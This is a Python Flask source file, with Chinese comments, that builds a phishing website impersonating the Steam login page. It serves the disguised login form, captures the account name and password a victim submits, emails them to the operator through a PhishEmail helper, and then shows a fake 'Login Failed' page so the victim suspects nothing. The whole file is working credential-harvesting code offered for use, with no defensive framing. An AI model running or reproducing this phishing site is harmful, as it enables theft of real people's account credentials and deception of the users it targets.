# -*- coding: gbk -*-
from typing import Optional
from flask import *
import logging
from phish_email import PhishEmail

#负责搭建钓鱼网站
class PhishWebsite():
    __website = Flask(__name__, template_folder='Templates', static_url_path='', static_folder='Templates') #HTML文件放在Templates文件夹
    __log = logging.getLogger('werkzeug')
    __phish_email : Optional[PhishEmail] = None
    __is_english = False
    
    @classmethod
    def run(cls):
        '''
        启动钓鱼网站，IP为本机连接局域网的网卡的IP，端口号5000
        '''
        cls.__log.setLevel(logging.ERROR)   #只显示错误日志，不再显示其它日志
        cls.__website.run(host='0.0.0.0', port=5000)

    @classmethod
    def set_phish_email(cls, phish_email : Optional[PhishEmail], is_english : bool = False):
        '''
        设置钓鱼邮件的实例，需要通过这个实例给发送者邮箱发送钓鱼成功时的回复。

        参数
        phish_email (PhishEmail): 钓鱼邮件的实例
        '''
        cls.__phish_email = phish_email
        cls.__is_english = is_english

    @__website.route('/')
    def home():
        '''
        网址：http://本机IP:5000
        '''
        return '''
        <html>
        <head>
            <title>Simple Phish Websit</title>
            <style>
                .center {
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    font-size: 2em;
                    font-weight: bold;
                }
            </style>
        </head>
        <body>
            <div class="center">Simple Phish Websit</div>
        </body>
        </html>
        '''

    @__website.route('/login')
    def login():
        '''
        伪造的登录界面。
        网址：http://本机IP:5000/login
        '''
        if (PhishWebsite.__is_english): return render_template('Disguised Steam Login (English).html')
        else: return render_template('Disguised Steam Login.html')

    @__website.route('/loginfailed', methods=['POST'])
    def submit():
        '''
        登录失败界面，按下登录键后必定跳转到此处。
        网址：http://本机IP:5000/loginfailed
        '''
        account = request.form.get('account')
        password = request.form.get('password')
        if PhishWebsite.__phish_email: PhishWebsite.__phish_email.send_reply(account, password)
        return '''
        <html>
        <head>
            <title>Login Failed</title>
            <style>
                .center {
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    font-size: 2em;
                    font-weight: bold;
                }
            </style>
        </head>
        <body>
            <div class="center">Login Failed</div>
        </body>
        </html>
        '''